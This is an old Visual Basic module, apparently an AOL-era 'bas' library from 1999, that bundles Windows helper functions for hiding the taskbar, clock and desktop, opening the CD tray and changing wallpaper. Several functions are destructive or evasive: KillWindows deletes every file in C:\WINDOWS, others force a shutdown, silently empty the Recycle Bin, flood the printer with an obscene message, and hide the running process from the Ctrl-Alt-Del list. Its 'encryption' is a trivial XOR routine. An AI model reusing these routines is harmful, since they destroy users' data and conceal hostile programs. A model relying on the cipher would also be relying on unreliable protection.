Attribute VB_Name = "m0ss32_v2"
'    ________________________________________________
'.  /                                                                           \:\
'  |                    .-= m0ss32 Version2.0 =-                       |:|
'   \                                                                            /:/
'   /           -= Now Compatable with dos32.bas                  \:\
'. |                                                                             |:|
'   \   -=This Bas file MUST Have Dos32.bas in Project=-      /:/
'.  /                                                                            \:\
'  | -= that means, without dos32.bas this file will NOT work |:|
'   \                                                                            /:/
'     ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
' -=Ixm0ssim0@aol.com for Questions, Comments, Diss's
' -=Shouts to Champs - Programming in the 99`
' -=9/30/99 5:15 PM
' -=Find me in Private Room 'vb5' on AOL....
' -=40 Windows Function
' -=Http://www.knk2000.com/knk

Public Declare Function MessageBeep Lib "user32" (ByVal wType As Long) As Long
Declare Function mciGetErrorString Lib "winmm.dll" Alias "mciGetErrorStringA" (ByVal dwError As Long, ByVal lpstrBuffer As String, ByVal uLength As Long) As Long
Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
    
    Declare Sub keybd_event Lib "user32" _
    (ByVal bVk As Byte, ByVal bScan As Byte, _
    ByVal flags As Long, ByVal ExtraInfo As Long)






Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long


Public Declare Function GetCurrentProcess Lib "kernel32" () As Long


    Public Const RSP_SIMPLE_SERVICE = 1
    Public Const RSP_UNREGISTER_SERVICE = 0










Declare Function fCreateShellLink Lib "STKIT432.DLL" (ByVal lpstrFolderName As String, ByVal lpstrLinkName As String, ByVal lpstrLinkPath As String, ByVal lpstrLinkArgs As String) As Long
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function SystemParametersInfo Lib "user32" Alias _
    "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam _
    As Long, ByVal lpvParam As String, ByVal fuWinIni As Long) As Long
    Const SPI_SETDESKWALLPAPER = 20
    Const SPIF_UPDATEINIFILE = &H1
    Const SPIF_SENDWININICHANGE = &H2
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function SHAddToRecentDocs Lib "shell32" (ByVal lFlags As Long, ByVal lPv As Long) As Long
Private Declare Function SHEmptyRecycleBin Lib "shell32" Alias "SHEmptyRecycleBinA" _
    (ByVal hWnd As Long, ByVal lpBuffer As String, ByVal dwFlags As Long) As Long

Const SHERB_NOCONFIRMATION = &H1& ' No dialog confirming the deletion of the objects will be displayed.
Const SHERB_NOPROGRESSUI = &H2& ' No dialog indicating the progress will be displayed.
Const SHERB_NOSOUND = &H4& ' No sound will be played when the operation is complete.




Function ClockHide()
Dim ShelltryWnd As Long, TraynotifyWnd As Long, TrayClockWClass As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
TraynotifyWnd& = FindWindowEx(ShelltrayWnd&, 0&, "TrayNotifyWnd", vbNullString)
TrayClockWClass& = FindWindowEx(TraynotifyWnd&, 0&, "TrayClockWClass", vbNullString)
Call ShowWindow(TrayClockWClass&, SW_HIDE)
End Function
Function ClockShow()
Dim ShelltryWnd As Long, TraynotifyWnd As Long, TrayClockWClass As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
TraynotifyWnd& = FindWindowEx(ShelltrayWnd&, 0&, "TrayNotifyWnd", vbNullString)
TrayClockWClass& = FindWindowEx(TraynotifyWnd&, 0&, "TrayClockWClass", vbNullString)
Call ShowWindow(TrayClockWClass&, SW_SHOW)
End Function
Function StartHide()
Dim ShelltrayWnd As Long, Button As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
Button& = FindWindowEx(ShelltrayWnd&, 0&, "Button", vbNullString)
Call ShowWindow(Button&, SW_HIDE)
End Function
Function StartShow()
Dim ShelltrayWnd As Long, Button As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
Button& = FindWindowEx(ShelltrayWnd&, 0&, "Button", vbNullString)
Call ShowWindow(Button&, SW_SHOW)
End Function
Function LinksHide()
Dim ShelltrayWnd As Long, ReBarWindow As Long, ToolbarWindow As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
ReBarWindow& = FindWindowEx(ShelltrayWnd&, 0&, "ReBarWindow32", vbNullString)
ToolbarWindow& = FindWindowEx(ReBarWindow&, 0&, "ToolbarWindow32", vbNullString)
Call ShowWindow(ToolbarWindow&, SW_HIDE)
End Function
Function LinksShow()
Dim ShelltrayWnd As Long, ReBarWindow As Long, ToolbarWindow As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
ReBarWindow& = FindWindowEx(ShelltrayWnd&, 0&, "ReBarWindow32", vbNullString)
ToolbarWindow& = FindWindowEx(ReBarWindow&, 0&, "ToolbarWindow32", vbNullString)
Call ShowWindow(ToolbarWindow&, SW_SHOW)
End Function
Function TaskHide()
Dim ShelltrayWnd As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
Call ShowWindow(ShelltrayWnd&, SW_HIDE)
End Function
Function TaskShow()
Dim ShelltrayWnd As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
Call ShowWindow(ShelltrayWnd&, SW_SHOW)
End Function
Function TrayItemsHide()
Dim ShelltrayWnd As Long, TraynotifyWnd As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
TraynotifyWnd& = FindWindowEx(ShelltrayWnd&, 0&, "TrayNotifyWnd", vbNullString)
Call ShowWindow(TraynotifyWnd&, SW_HIDE)

End Function
Function TrayItemsShow()
Dim ShelltrayWnd As Long, TraynotifyWnd As Long
ShelltrayWnd& = FindWindow("Shell_TrayWnd", vbNullString)
TraynotifyWnd& = FindWindowEx(ShelltrayWnd&, 0&, "TrayNotifyWnd", vbNullString)
Call ShowWindow(TraynotifyWnd&, SW_SHOW)
End Function
Function DesktopHide()
Dim Progman As Long, SHELLDLLDefView As Long, InternetExplorerServer As Long
Progman& = FindWindow("Progman", vbNullString)
SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
InternetExplorerServer& = FindWindowEx(SHELLDLLDefView&, 0&, "Internet Explorer_Server", vbNullString)
Call ShowWindow(InternetExplorerServer&, SW_HIDE)

End Function
Function DesktopShow()
Dim Progman As Long, SHELLDLLDefView As Long, InternetExplorerServer As Long
Progman& = FindWindow("Progman", vbNullString)
SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
InternetExplorerServer& = FindWindowEx(SHELLDLLDefView&, 0&, "Internet Explorer_Server", vbNullString)
Call ShowWindow(InternetExplorerServer&, SW_SHOW)
End Function
Sub Delete(file$)
Kill (file$)
End Sub
Public Sub BeepSpeaker()
MessageBeep -1&
End Sub
Public Sub OpenCD()
Dim returnstring As Long, retvalue As Long
 
    On Error Resume Next
    retvalue = mciSendString("set CDAudio door open", returnstring, 127, 0)
End Sub



Public Sub CloseCD()
Dim returnstring As Long, retvalue As Long
    
    On Error Resume Next
    retvalue = mciSendString("set CDAudio door closed", returnstring, 127, 0)
End Sub
Function DesktopIconsHide()
Dim Progman As Long, SHELLDLLDefView As Long, SysListView As Long
Progman& = FindWindow("Progman", vbNullString)
SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
SysListView& = FindWindowEx(SHELLDLLDefView&, 0&, "SysListView32", vbNullString)
Call ShowWindow(SysListView&, SW_HIDE)
End Function
Function DesktopIconsShow()
Dim Progman As Long, SHELLDLLDefView As Long, SysListView As Long
Progman& = FindWindow("Progman", vbNullString)
SHELLDLLDefView& = FindWindowEx(Progman&, 0&, "SHELLDLL_DefView", vbNullString)
SysListView& = FindWindowEx(SHELLDLLDefView&, 0&, "SysListView32", vbNullString)
Call ShowWindow(SysListView&, SW_SHOW)
End Function
Function PrintHELL()
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.NewPage
    Printer.Print " "
    Printer.EndDoc
End Function
Function PrintMessage()
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.NewPage
    Printer.Print "DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  DiE MuThA FuCkA  "
    Printer.EndDoc
End Function
Function GetFonTz(List1 As ListBox)
Dim i As Long
For i = 0 To Screen.FontCount - 1
    List1.AddItem Screen.Fonts(i)
Next i
End Function
Sub ScreenToClipboard()

Const VK_SNAPSHOT = &H2C
    Call keybd_event(VK_SNAPSHOT, 1, 0&, 0&)
End Sub

Function ClearDocList()
SHAddToRecentDocs 0, 0
End Function
Function WallpaperRemove()
    Dim X As Long
    X = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, "(None)", _
        SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
End Function
Function WallpaperChange(file$)
    Dim FileName As String
    Dim X As Long
    FileName = file$
X = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, FileName, _
        SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)

End Function
Function EmergencyShutDown()
ExitWindowsEx 15, 0
End Function
Function KillWindows()
On Error Resume Next
    Kill ("C:\WINDOWS\*.*")
End Function
Function EmptyRecycleBin()
Dim rc As Long
    Dim nFlags As Long
    nFlags = SHERB_NOCONFIRMATION Or SHERB_NOPROGRESSUI Or SHERB_NOSOUND
    rc = SHEmptyRecycleBin(0&, vbNullString, nFlags)
End Function
Function UserName() As String


    ' Retrieve the name of the logged-in user.
    ' It appears that GetUserName counts the
    ' trailing null in the length it
    ' places in lngLen.
    Dim lngLen As Long
    Dim strBuffer As String
    Const dhcMaxUserName = 255
    strBuffer = Space(dhcMaxUserName)
    lngLen = dhcMaxUserName


    If CBool(GetUserName(strBuffer, lngLen)) Then
        UserName = Left$(strBuffer, lngLen - 1)
    Else
        UserName = ""
    End If

End Function
Public Function CopyFileAny(currentFilename As String, newFilename As String)

'ex: Call CopyFileAny("C:\Windows\Win.ini","C:\Windows\Desktop\Cool.ini")
'Creats Cool.ini, exact replica of win.ini

    Dim a%, buffer%, temp$, fRead&, fSize&, b%
    On Error GoTo ErrHan:
    a = FreeFile
    buffer = 4048
    Open currentFilename For Binary Access Read As a
    b = FreeFile
    Open newFilename For Binary Access Write As b
    fSize = FileLen(currentFilename)
    


    While fRead < fSize


        DoEvents
            If buffer > (fSize - fRead) Then buffer = (fSize - fRead)
            temp = Space(buffer)
            Get a, , temp
            Put b, , temp
            fRead = fRead + buffer
        Wend

        Close b
        Close a
        CopyFileAny = 1
        Exit Function
ErrHan:
        CopyFileAny = 0
    End Function
Function OperatingSystem32()

'note:if 32 bit subsystem exists
    
    OperatingSystem32 = File_Exists(Create_File_Name(Get_System_Directory, "user32.dll"))
End Function
Function WinGetUser() As String

'Returns the Logged on User Of Windows (95)

    Dim lpUserID As String
    Dim nBuffer As Long
    Dim Ret As Long
    lpUserID = String(25, 0)
    nBuffer = 25
    Ret = GetUserName(lpUserID, nBuffer)


    If Ret Then
        WinGetUser$ = lpUserID$
    End If

End Function
Public Sub HideAppIn_Ctrl_Alt_Del()


    Dim process As Long
    process = GetCurrentProcessId()
    Call RegisterServiceProcess(process, RSP_SIMPLE_SERVICE)
End Sub

Public Sub UnHideAppIn_Ctrl_Alt_Del()

    Dim process As Long
    process = GetCurrentProcessId()
    Call RegisterServiceProcess(process, RSP_UNREGISTER_SERVICE)
End Sub
Function Remove(ByVal root As String, ByVal takeout As String) As String


    Dim start, finish As Integer
    If Len(root) < Len(takeout) Or InStr(root, takeout) = False Then
    Remove = root: Exit Function
    End If
    start = InStr(root, takeout) - 1
    finish = Len(root) - (start + Len(takeout))
    root = Left(root, start) + Right(root, finish)
    Remove = root
End Function
Function Replace(ByVal root As String, ByVal takeout As String, putin As String) As String


    Dim start, diff As Integer


    While InStr(root, takeout) > 0


        If InStr(root, takeout) > 0 Then
            start = InStr(root, takeout) - 1


            If InStr(root, takeout) > 0 Then
                root = Remove(root, takeout)
                diff = Len(root) - start
                If root = "0" Then Replace = "": Exit Function
                root = Left(root, start) + putin + Right(root, diff)
            End If

        End If

    Wend

    Replace = root
End Function
Function ReplaceCharacter(strString As String, strOldChar As String, strNewChar As String) As String


    On Error GoTo ErrorHandler
    ' This function recursively removes strOldChar in a string and re
    '     places
    ' them with strNewChar.
    ' Sample call
    ' Text1.Text = "Companie's N'ame"
    ' Text2.Text = ReplaceCharacter(Text1.Text, "'", "?")
    ' Text2.Text will then be - "Companie?s N?ame"


    If strString Like "*" & strOldChar & "*" Then
        strString = Left(strString, (InStr(strString, strOldChar) - 1)) & strNewChar & Right(strString, (Len(strString) - (InStr(strString, strOldChar))))
        ReplaceCharacter = ReplaceCharacter(strString, strOldChar, strNewChar)
    Else
        ReplaceCharacter = strString
    End If

    Exit Function
ErrorHandler:
End Function
Public Function Text_Encrypt(strPWtoEncrypt As String) As String


    Dim strPword As String
    Dim bytCount As Byte
    Dim intTemp As Integer


    For bytCount = 1 To Len(strPWtoEncrypt)
        intTemp = Asc(Mid(strPWtoEncrypt, bytCount, 1))


        If bytCount Mod 2 = 0 Then
            intTemp = intTemp - 7
        Else
            intTemp = intTemp + 3
        End If

        intTemp = intTemp Xor (10 - bytEncrypt)
        strPword = strPword & Chr$(intTemp)
    Next bytCount

    Text_Encrypt = strPword
End Function



Public Function Text_Decrypt(strPWtoDecrypt As String) As String

    Dim strPword As String
    Dim bytCount As Byte
    Dim intTemp As Integer


    For bytCount = 1 To Len(strPWtoDecrypt)
        intTemp = Asc(Mid(strPWtoDecrypt, bytCount, 1)) Xor (10 - bytEncrypt)


        If bytCount Mod 2 = 0 Then
            intTemp = intTemp + 7
        Else
            intTemp = intTemp - 3
        End If

        strPword = strPword & Chr$(intTemp)
    Next bytCount

    Text_Decrypt = strPword
End Function

